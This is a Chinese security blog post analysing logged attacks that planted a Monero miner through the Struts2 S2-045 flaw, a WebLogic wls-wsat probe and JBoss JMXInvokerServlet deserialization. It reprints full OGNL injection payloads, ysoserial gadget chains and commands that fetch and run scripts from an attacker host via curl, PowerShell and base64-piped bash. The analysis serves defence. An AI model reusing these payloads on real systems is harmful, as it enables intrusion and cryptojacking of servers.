<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>利用java反序列化漏洞植入门罗币挖矿程序事件分析 | SY0U&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="近期检测到某台主机利用多个漏洞植入挖矿程序的行为，下面简单分析一下： 最近几天45.123.190.147这个ip，连续发起恶意请求，相关日志如下： s2-045相关日志： 12345645.123.190.147 51977 172.17.0.2 8080 - - [08/Jan/2018:15:59:08 +0000] &quot;POST /orders.xhtml HTTP/1.1&quot; [--9b4e">
<meta property="og:type" content="website">
<meta property="og:title" content="利用java反序列化漏洞植入门罗币挖矿程序事件分析">
<meta property="og:url" content="http://wsygoogol.github.io/利用java反序列化漏洞植入门罗币挖矿程序事件分析.html">
<meta property="og:site_name" content="SY0U&#39;s Blog">
<meta property="og:description" content="近期检测到某台主机利用多个漏洞植入挖矿程序的行为，下面简单分析一下： 最近几天45.123.190.147这个ip，连续发起恶意请求，相关日志如下： s2-045相关日志： 12345645.123.190.147 51977 172.17.0.2 8080 - - [08/Jan/2018:15:59:08 +0000] &quot;POST /orders.xhtml HTTP/1.1&quot; [--9b4e">
<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/16-32-3.png">
<meta property="og:updated_time" content="2018-01-11T06:02:11.861Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="利用java反序列化漏洞植入门罗币挖矿程序事件分析">
<meta name="twitter:description" content="近期检测到某台主机利用多个漏洞植入挖矿程序的行为，下面简单分析一下： 最近几天45.123.190.147这个ip，连续发起恶意请求，相关日志如下： s2-045相关日志： 12345645.123.190.147 51977 172.17.0.2 8080 - - [08/Jan/2018:15:59:08 +0000] &quot;POST /orders.xhtml HTTP/1.1&quot; [--9b4e">
<meta name="twitter:image" content="h:/gitBlog/themes/landscape/source/upload_image/16-32-3.png">
  
    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">SY0U&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="page-undefined" class="article article-type-page" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/利用java反序列化漏洞植入门罗币挖矿程序事件分析.html" class="article-date">
  <time datetime="2018-01-10T13:11:50.000Z" itemprop="datePublished">2018-01-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      利用java反序列化漏洞植入门罗币挖矿程序事件分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>近期检测到某台主机利用多个漏洞植入挖矿程序的行为，下面简单分析一下：</p>
<p>最近几天<strong>45.123.190.147</strong>这个ip，连续发起恶意请求，相关日志如下：</p>
<p>s2-045相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 51977 172.17.0.2 8080 - - [08/Jan/2018:15:59:08 +0000] <span class="string">"POST /orders.xhtml HTTP/1.1"</span> [--9b4e930e84c24dd896eac1be4a4dfa8c</div><div class="line">Content-Disposition: form-data; name=<span class="string">"fieldNameHere"</span>; filename=<span class="string">"123.html"</span></div><div class="line"></div><div class="line">testtest</div><div class="line">--9b4e930e84c24dd896eac1be4a4dfa8c--</div><div class="line">] 400 - [python-requests/2.18.4] [%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl 45.123.190.178/lin.txt | sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.134 2715</span></div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 49290 172.17.0.2 8080 - - [07/Jan/2018:02:51:10 +0000] <span class="string">"POST /orders.xhtml HTTP/1.1"</span> [--167f39dfb34648d58ec2d781097677a6</div><div class="line">Content-Disposition: form-data; name=<span class="string">"fieldNameHere"</span>; filename=<span class="string">"123.html"</span></div><div class="line"></div><div class="line">testtest</div><div class="line">--167f39dfb34648d58ec2d781097677a6--</div><div class="line">] 400 - [python-requests/2.18.4] [%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(\'http://45.123.190.178/win.txt\')"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.798 2715</span></div></pre></td></tr></table></figure>
<p>可以看到这里利用的是 S2-045 漏洞，发送恶意 ognl 表达式，关键命令是从远程服务器下载脚本并执行，稍后再看这两个脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl 45.123.190.178/lin.txt | sh</div><div class="line">powershell -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString(\'http://45.123.190.178/win.txt\')"</span></div></pre></td></tr></table></figure>
<p>weblogic wls反序列化漏洞相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 34220 172.17.0.2 8080 - - [08/Jan/2018:16:05:05 +0000] <span class="string">"GET /wls-wsat/CoordinatorPortType11 HTTP/1.1"</span> [] 404 - [python-requests/2.18.4] [-] 0.011 1051</div><div class="line">45.123.190.147 34280 172.17.0.2 8080 - - [08/Jan/2018:16:05:05 +0000] <span class="string">"GET /wls-wsat/CoordinatorPortType HTTP/1.1"</span> [] 404 - [python-requests/2.18.4] [-] 0.003 1051</div></pre></td></tr></table></figure>
<p>它探测了 wls-wsat 模块是否存在，这个模块联系到前几天爆发的weblogic wls反序列化漏洞，如果能够访问存在缺陷的模块就发起攻击，说明 XMLDecoder 漏洞也正在被用于黑产行为</p>
<p> JBoss JMXInvokerServlet 反序列化漏洞相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 58694 172.17.0.2 8080 - - [08/Jan/2018:17:27:44 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�<span class="string">'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</span></div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t fpowershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt<span class="string">')"t execuq ~ q ~ #sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ :] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue] 0.008 1049</div><div class="line"></div><div class="line"></div><div class="line">45.123.190.147 58733 172.17.0.2 8080 - - [08/Jan/2018:17:27:44 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" [�� sr .javax.management.BadAttributeValueExpException��ګc-F@ L valt Ljava/lang/Object;xr java.lang.Exception��&gt;;� xr java.lang.Throwable��5'9w�� L causet Ljava/lang/Throwable;L detailMessaget Ljava/lang/String;[</div><div class="line">stackTracet [Ljava/lang/StackTraceElement;L suppressedExceptionst Ljava/util/List;xpq ~ pur [Ljava.lang.StackTraceElement;F*&lt;&lt;�<span class="string">"9 xp sr java.lang.StackTraceElementa Ś&amp;6݅ I</span></div><div class="line">lineNumberL declaringClassq ~ L fileNameq ~ L</div><div class="line">methodNameq ~ xp St &amp;ysoserial.payloads.CommonsCollections5t CommonsCollections5.javat getObjectsq ~ 5q ~ q ~ q ~ sq ~ "t ysoserial.GeneratePayloadt GeneratePayload.javat mainsr &amp;java.util.Collections<span class="variable">$UnmodifiableList</span>�%1�� L listq ~ xr ,java.util.Collections<span class="variable">$UnmodifiableCollectionB</span> ��^� L ct Ljava/util/Collection;xpsr java.util.ArrayListx����a� I sizexp w xq ~ xsr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyq ~ L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNameq ~ [ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ 2 vr java.lang.String��8z;�B xpvq ~ 2sq ~ +uq ~ / puq ~ / t invokeuq ~ 2 vr java.lang.Object xpvq ~ /sq ~ +ur [Ljava.lang.String;��V��&#123;G xp t fpowershell.exe -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt')"</span>t execuq ~ 2 q ~ 7sq ~ <span class="string">'sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line">loadFactorI thresholdxp?@ w xx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue] 0.002 1049</div><div class="line"></div><div class="line">45.123.190.147 54900 172.17.0.2 8080 - - [08/Jan/2018:19:24:35 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ q ~ <span class="comment">#sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line"></div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ :] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.009 1049</div><div class="line"></div><div class="line">45.123.190.147 55001 172.17.0.2 8080 - - [08/Jan/2018:19:24:35 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr java.util.HashSet�D�����4 xpw ?@ sr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyt Ljava/lang/Object;L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ q ~ sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xxx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div><div class="line"></div><div class="line">45.123.190.147 55040 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr .javax.management.BadAttributeValueExpException��ګc-F@ L valt Ljava/lang/Object;xr java.lang.Exception��&gt;;� xr java.lang.Throwable��5<span class="string">'9w�� L causet Ljava/lang/Throwable;L detailMessaget Ljava/lang/String;[</span></div><div class="line">stackTracet [Ljava/lang/StackTraceElement;L suppressedExceptionst Ljava/util/List;xpq ~ pur [Ljava.lang.StackTraceElement;F*&lt;&lt;�"9 xp sr java.lang.StackTraceElementa Ś&amp;6݅ I</div><div class="line">lineNumberL declaringClassq ~ L fileNameq ~ L</div><div class="line">methodNameq ~ xp St &amp;ysoserial.payloads.CommonsCollections5t CommonsCollections5.javat getObjectsq ~ 5q ~ q ~ q ~ sq ~ "t ysoserial.GeneratePayloadt GeneratePayload.javat mainsr &amp;java.util.Collections$UnmodifiableList�%1�� L listq ~ xr ,java.util.Collections$UnmodifiableCollectionB ��^� L ct Ljava/util/Collection;xpsr java.util.ArrayListx����a� I sizexp w xq ~ xsr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyq ~ L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNameq ~ [ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ 2 vr java.lang.String��8z;�B xpvq ~ 2sq ~ +uq ~ / puq ~ / t invokeuq ~ 2 vr java.lang.Object xpvq ~ /sq ~ +ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ 2 q ~ 7sq ~ 'sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div><div class="line"></div><div class="line">45.123.190.147 55074 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr java.util.PriorityQueue��0��?�� I sizeL</div><div class="line">comparatort Ljava/util/Comparator;xp sr Borg.apache.commons.collections4.comparators.TransformingComparator/���+�� L decoratedq ~ L transformert -Lorg/apache/commons/collections4/Transformer;xpsr @org.apache.commons.collections4.comparators.ComparableComparator���%�n�7 xpsr ;org.apache.commons.collections4.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst .[Lorg/apache/commons/collections4/Transformer;xpur .[Lorg.apache.commons.collections4.Transformer;9�:��?� xp sr &lt;org.apache.commons.collections4.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr 7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter xpsr ?org.apache.commons.collections4.functors.InstantiateTransformer4�����; [ iArgst [Ljava/lang/Object;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp sr :com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl WO�n��3 I _indentNumberI _transletIndex[</div><div class="line">_bytecodest [[B[ _classq ~ L _namet Ljava/lang/String;L _outputPropertiest Ljava/util/Properties;xp ����ur [[BK�gg�7 xp ur [B���T� xp ����� 2 9</div><div class="line"><span class="string">" 7 % &amp; serialVersionUID J ConstantValue� ����&gt; &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this StubTransletPayload InnerClasses 5Lysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span>; transform r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V document -Lcom/sun/org/apache/xalan/internal/xsltc/DOM; handlers B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></div><div class="line">Exceptions ' �(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V iterator 5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator; handler ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</div><div class="line">SourceFile Gadgets.java</div><div class="line">( 3ysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span> @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet java/io/Serializable 9com/sun/org/apache/xalan/internal/xsltc/TransletException ysoserial/payloads/util/Gadgets &lt;clinit&gt; java/lang/Runtime *</div><div class="line">getRuntime ()Ljava/lang/Runtime; , -</div><div class="line">+ . Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 0 exec '(Ljava/lang/String;)Ljava/lang/Process; 2 3</div><div class="line">+ 4 StackMapTable ysoserial/Pwner3888495553177549 !Lysoserial/Pwner3888495553177549; !</div><div class="line">/ *� � . 8 ? � 3 8 I � 7 * 8 ) $ � L� /1� 5W� 6 !</div><div class="line"># uq ~ ����� 2</div><div class="line">serialVersionUID J ConstantValueq�i�&lt;mG &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this Foo InnerClasses %Lysoserial/payloads/util/Gadgets<span class="variable">$Foo</span>;</div><div class="line">SourceFile Gadgets.java</div><div class="line">#ysoserial/payloads/util/Gadgets<span class="variable">$Foo</span> java/lang/Object java/io/Serializable ysoserial/payloads/util/Gadgets !</div><div class="line">/ *� � ;</div><div class="line">pt Pwnrpw xur [Ljava.lang.Class;�׮��Z� xp vr javax.xml.transform.Templates xpw sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp q ~ )x] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org<span class="string">".jboss.invocation.MarshalledValue] 0.005 1049</span></div><div class="line"></div><div class="line">45.123.190.147 55115 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1<span class="string">" [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr 7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter xpsr &gt;org.apache.commons.collections.functors.InstantiateTransformer4�����; [ iArgst [Ljava/lang/Object;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp sr :com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl WO�n��3 I _indentNumberI _transletIndex[</span></div><div class="line">_bytecodest [[B[ _classq ~ L _namet Ljava/lang/String;L _outputPropertiest Ljava/util/Properties;xp ����ur [[BK�gg�7 xp ur [B���T� xp ����� 2 9</div><div class="line">" 7 % &amp; serialVersionUID J ConstantValue� ����&gt; &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this StubTransletPayload InnerClasses 5Lysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span>; transform r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V document -Lcom/sun/org/apache/xalan/internal/xsltc/DOM; handlers B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</div><div class="line">Exceptions <span class="string">' �(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V iterator 5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator; handler ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></div><div class="line">SourceFile Gadgets.java</div><div class="line">( 3ysoserial/payloads/util/Gadgets$StubTransletPayload @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet java/io/Serializable 9com/sun/org/apache/xalan/internal/xsltc/TransletException ysoserial/payloads/util/Gadgets &lt;clinit&gt; java/lang/Runtime *</div><div class="line">getRuntime ()Ljava/lang/Runtime; , -</div><div class="line">+ . Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 0 exec '(Ljava/lang/String;)Ljava/lang/Process; 2 3</div><div class="line">+ 4 StackMapTable ysoserial/Pwner3888495209839455 !Lysoserial/Pwner3888495209839455; !</div><div class="line">/ *� � . 8 ? � 3 8 I � 7 * 8 ) $ � L� /1� 5W� 6 !</div><div class="line"><span class="comment"># uq ~ # ����� 2</span></div><div class="line">serialVersionUID J ConstantValueq�i�&lt;mG &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this Foo InnerClasses %Lysoserial/payloads/util/Gadgets<span class="variable">$Foo</span>;</div><div class="line">SourceFile Gadgets.java</div><div class="line"><span class="comment">#ysoserial/payloads/util/Gadgets$Foo java/lang/Object java/io/Serializable ysoserial/payloads/util/Gadgets !</span></div><div class="line">/ *� � ;</div><div class="line">pt Pwnrpw xur [Ljava.lang.Class;�׮��Z� xp vr javax.xml.transform.Templates xpsr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ .] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div></pre></td></tr></table></figure>
